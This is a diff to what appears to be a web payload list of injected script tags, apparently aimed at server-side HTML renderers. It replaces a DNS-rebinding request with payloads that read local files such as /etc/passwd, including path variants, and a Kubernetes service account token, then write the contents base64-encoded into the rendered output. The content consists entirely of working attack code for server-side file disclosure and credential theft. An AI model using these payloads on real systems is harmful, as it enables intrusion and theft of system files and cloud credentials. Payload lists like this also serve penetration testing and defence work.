@@ -1,10 +1,25 @@
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","http://2a001e9d.a9fea9fe.rbndr.us/404");x.send();
+x.open("GET","/etc/passwd");x.send();
 </script>
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","http://2a001e9d.a9fea9fe.rbndr.us/404");x.send();
+x.open("GET","file:///etc/passwd");x.send();
+</script>
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file://path/to/file");x.send();
+</script>
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file://\/\/etc/passwd");x.send();
+</script>
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///var/run/secrets/kubernetes.io/serviceaccount/token");x.send();
 </script>
